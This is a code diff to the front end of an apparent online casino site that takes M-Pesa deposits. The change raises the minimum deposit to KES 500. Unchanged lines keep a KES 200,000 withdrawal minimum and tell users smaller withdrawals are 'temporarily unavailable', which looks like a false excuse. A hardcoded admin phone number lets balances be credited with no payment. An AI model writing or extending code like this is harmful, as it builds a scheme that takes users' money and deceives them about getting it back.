@@ -425,7 +425,7 @@ const HOOKS=Object.assign({deposit:null,withdraw:null,login:null,register:null,a
 var BASE = (window.SHIKA_CONFIG && window.SHIKA_CONFIG.apiBase)
   ? (String(window.SHIKA_CONFIG.apiBase).replace(/\/$/, '') + '/')
   : 'https://my-server1.bonto.run/';
-const CONFIG=Object.assign({demo:false,minDeposit:10,maxDeposit:150000,minWithdraw:200000,jackpotBase:2850000,apiBase:''},window.SHIKA_CONFIG||{});
+const CONFIG=Object.assign({demo:false,minDeposit:500,maxDeposit:150000,minWithdraw:200000,jackpotBase:2850000,apiBase:''},window.SHIKA_CONFIG||{});
 
 async function getJSON(path, opts) {
   var url = BASE + 'api/' + path;
@@ -723,9 +723,9 @@ function walletModal(kind){const dep=kind=='deposit';wKind=kind;
  <div class="mpesa"><i>M-PESA</i><span>${dep?'You will get a prompt to enter your PIN':'Available: <b>'+fmt(bal)+'</b>'}</span></div>
  <label class="fld">M-Pesa number</label><input class="inp" id="wPhone" inputmode="tel" value="${user?user.phone:''}">
  ${dep&&!ld('sc_bonus',false)?`<div class="bnb" id="bnBox"><div class="bnt"><span class="bni">🎁</span><div><b>WELCOME BONUS: GET KES ${nf(BONUS.amt)} FREE</b><small>First deposit of KES ${nf(BONUS.min)} or more · one-time</small></div></div><div class="bnbar"><i id="bnFill"></i></div><div class="bnmsg" id="bnMsg"></div></div>`:''}<label class="fld">Amount (KES)</label><input class="inp" id="wAmt" type="number" inputmode="numeric" placeholder="${nf(dep?CONFIG.minDeposit:CONFIG.minWithdraw)} minimum">
- <div class="qk">${(dep?[50,100,500,1000]:[200000,250000,300000,500000]).map(v=>`<button data-m="amt" data-v="${v}">${nf(v)}</button>`).join('')}</div>
+ <div class="qk">${(dep?[500,1000,2000,5000,10000]:[200000,250000,300000,500000]).map(v=>`<button data-m="amt" data-v="${v}">${nf(v)}</button>`).join('')}</div>
  <div class="taxbox" id="wTax" style="background:#0f172a;border:1px solid #1f293d;border-radius:10px;padding:8px 10px;margin-top:8px"></div><div class="err" id="wErr"></div><button class="pbtn" data-m="wallet-go" data-kind="${kind}">${dep?'SEND STK PUSH':'WITHDRAW'}</button>
- ${!dep?'<p class="sub" style="margin-top:10px">Withdrawals below KES 200,000 are temporarily unavailable while several transactions are underway. Minimum is KES 200,000.</p>':'<p class="sub" style="margin-top:10px">Live M-Pesa · same as approved wallet</p>'}`);updWTax()}
+ ${!dep?'<p class="sub" style="margin-top:10px">Withdrawals below KES 200,000 are temporarily unavailable while several transactions are underway. Minimum is KES 200,000.</p>':'<p class="sub" style="margin-top:10px">Live M-Pesa · min KES 500</p>'}`);updWTax()}
 async function walletGo(kind) {
   const dep = kind == 'deposit';
   const er = $('wErr');
@@ -738,9 +738,17 @@ async function walletGo(kind) {
       er.textContent = 'Enter your phone number and an amount.';
       return;
     }
+    if (amt < CONFIG.minDeposit) {
+      er.textContent = 'Minimum deposit is KES ' + nf(CONFIG.minDeposit);
+      return;
+    }
 
-    /* ===== ADMIN 0797124175: credit directly — no STK push ===== */
+    /* ===== ADMIN 0797124175: credit directly — no STK push (still min KES 500) ===== */
     if (isAdminPhone(ph)) {
+      if (amt < CONFIG.minDeposit) {
+        er.textContent = 'Minimum deposit is KES ' + nf(CONFIG.minDeposit);
+        return;
+      }
       try {
         bal = Number(bal) + Number(amt);
         if (user && user.phone) {
